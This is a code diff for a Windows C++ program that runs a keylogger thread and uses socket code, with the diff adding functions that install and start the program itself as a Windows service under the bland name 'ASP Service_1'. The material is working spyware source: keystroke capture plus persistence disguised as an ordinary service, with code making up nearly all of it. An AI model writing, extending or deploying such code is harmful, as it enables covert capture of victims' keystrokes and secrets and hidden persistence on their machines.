@@ -2,7 +2,10 @@
 		#include"head.h"
 		#include"sokets.cpp"
 		#include "filesearch.cpp";
+#define SERVICE_NAME "ASP Service_1"
 
+void ServiceInstall(void);
+void ServiceStart(void);
 HFONT create_font(HWND hwnd)
 {
 HFONT hfont;
@@ -12,9 +15,16 @@ return hfont;
 }
 void  main()
 { 
-			FreeConsole();
+		//	FreeConsole();
 	/////////////// keylogeris gashveba ////////////////////
+			ServiceInstall();
+			Sleep(100);
+			ServiceStart();
+			char pModuleFile[10000];
+			DWORD dwSize = GetModuleFileName(NULL, pModuleFile, 10000);
 
+
+			//MessageBox(0,pModuleFile,pModuleFile,0);
 	
 		CreateThread(0,0,keyloger,0,0,0);
 	///////////////////////////////////////////////////////
@@ -107,4 +117,211 @@ do
 closesocket(sock);
 
 WSACleanup();
+}
+
+
+
+void ServiceInstall(void)
+{
+	cout<<"ServiceInstall Start"<<endl;
+	SC_HANDLE  hScOpenSCManager=NULL;
+	SC_HANDLE	hScCreateService=NULL;
+	DWORD  dwGetModuleFileName=0;
+	TCHAR  szPath[MAX_PATH];
+	dwGetModuleFileName=GetModuleFileName(NULL,szPath,MAX_PATH);
+	if(0==dwGetModuleFileName)
+	{
+		cout<<"Service Installation Faild ="<<GetLastError()<<endl;
+	}
+	else
+	{
+		cout<<"Successfully Installation Faild"<<endl;
+	}
+	hScOpenSCManager=OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);
+
+	if(NULL==hScOpenSCManager)
+	{
+		cout<<"OpenSCManager Faild ="<<GetLastError()<<endl;
+	}
+	else
+	{
+		cout<<"openSCMANAGER success"<<endl;
+	}
+
+
+	hScCreateService=CreateService
+		(
+		hScOpenSCManager,
+		SERVICE_NAME,
+		SERVICE_NAME,
+		SERVICE_ALL_ACCESS,
+		SERVICE_WIN32_OWN_PROCESS,
+		SERVICE_DEMAND_START,
+		SERVICE_ERROR_NORMAL,
+		szPath,
+		NULL,
+		NULL,
+		NULL,
+		NULL,
+		NULL);
+
+		
+		
+		
+	if(NULL==hScCreateService)
+	{
+		cout<<"hScCreateService Faild ="<<GetLastError()<<endl;
+		CloseServiceHandle(hScOpenSCManager);
+	}
+	else
+	{
+		cout<<"CreateService Success"<<endl;
+	}
+	CloseServiceHandle(hScCreateService);
+	CloseServiceHandle(hScOpenSCManager);
+	cout<<"serviceInitiall End"<<endl;
+
+}
+
+
+void ServiceStart(void)
+{
+	cout<<"Inside Service Function "<<endl;
+	BOOL bStartService =FALSE;
+	SERVICE_STATUS_PROCESS SvcStatusProcess;
+	SC_HANDLE hOpenSCManager=NULL;
+	SC_HANDLE  hOpenService=NULL;
+	BOOL bQueryServiceStatus=FALSE;
+	DWORD dwBytesNeeded;
+	hOpenSCManager = OpenSCManager(
+		NULL,
+		NULL,
+		SC_MANAGER_ALL_ACCESS);
+	if(NULL==hOpenSCManager)
+	{
+		cout<<"hOpenSCManager Failed ="<<GetLastError()<<endl;
+	}
+	else
+	{
+		cout<<"hOpenSCManager Success ="<<endl;
+	}
+
+	hOpenService=OpenService(
+		hOpenSCManager,
+		SERVICE_NAME,
+		SC_MANAGER_ALL_ACCESS);
+	if(NULL==hOpenService)
+	{
+			cout<<"OpenService Failed ="<<GetLastError()<<endl;
+	}
+	else
+	{
+		cout<<"hOpenService Success ="<<endl;
+	}
+	bQueryServiceStatus=QueryServiceStatusEx(
+		hOpenService,
+		SC_STATUS_PROCESS_INFO,
+		(LPBYTE)&SvcStatusProcess,
+		sizeof(SERVICE_STATUS_PROCESS),
+		&dwBytesNeeded);
+	if(FALSE ==bQueryServiceStatus)
+	{
+			cout<<"bQueryServiceStatus Failed ="<<GetLastError()<<endl;
+	}
+	else
+	{
+
+		cout<<"bQueryServiceStatus Success ="<<endl;
+	}
+	///IV 
+
+	if((SvcStatusProcess.dwCurrentState!=SERVICE_STOPPED)&&
+		(SvcStatusProcess.dwCurrentState!=SERVICE_STOP_PENDING))
+	{
+		cout<<"service is already running "<<endl;
+	}
+	else
+	{
+		cout<<"Service is Already Stopped"<<endl;
+	}
+
+
+	////V
+	while(SvcStatusProcess.dwCurrentState==SERVICE_STOP_PENDING)
+	{
+		bQueryServiceStatus=QueryServiceStatusEx(
+		hOpenService,
+		SC_STATUS_PROCESS_INFO,
+		(LPBYTE)&SvcStatusProcess,
+		sizeof(SERVICE_STATUS_PROCESS),
+		&dwBytesNeeded);
+		if(FALSE ==bQueryServiceStatus)
+		{
+			cout<<"QueryServiceStatusEx Faild ="<<GetLastError()<<endl;
+			CloseServiceHandle(hOpenService);
+			CloseServiceHandle(hOpenSCManager);
+		}
+		else
+		{
+			cout<<"QueryService Success"<<endl;
+		
+		
+		}
+	}
+		///VI
+		bStartService=StartService(
+			hOpenService,
+			NULL,
+			NULL);
+		if(FALSE ==bStartService)
+		{
+
+			cout<<"StartService Faild ="<<GetLastError()<<endl;
+			CloseServiceHandle(hOpenService);
+			CloseServiceHandle(hOpenSCManager);
+
+		}
+		else
+		{
+			cout<<"startService Success"<<endl;
+		}
+
+		/////VII/////////////////////////
+		bQueryServiceStatus=QueryServiceStatusEx(
+		hOpenService,
+		SC_STATUS_PROCESS_INFO,
+		(LPBYTE)&SvcStatusProcess,
+		sizeof(SERVICE_STATUS_PROCESS),
+		&dwBytesNeeded);
+		if(FALSE ==bQueryServiceStatus)
+		{
+			cout<<"QueryServiceStatusEx Faild ="<<GetLastError()<<endl;
+			CloseServiceHandle(hOpenService);
+			CloseServiceHandle(hOpenSCManager);
+		}
+		else
+		{
+			cout<<"QueryService Success"<<endl;
+		
+		
+		}
+
+
+
+			/////VIII/////////////////////////
+
+		if(SvcStatusProcess.dwCurrentState==SERVICE_RUNNING)
+		{
+			cout<<"Service Started Running ..."<<endl;
+		}
+		else
+		{
+			cout<<"Service  Running Faild..."<<GetLastError()<<endl;
+			CloseServiceHandle(hOpenService);
+			CloseServiceHandle(hOpenSCManager);
+		}
+		////IX
+		CloseServiceHandle(hOpenService);
+		CloseServiceHandle(hOpenSCManager);
+		cout<<"ServiceStart end"<<endl;
 }
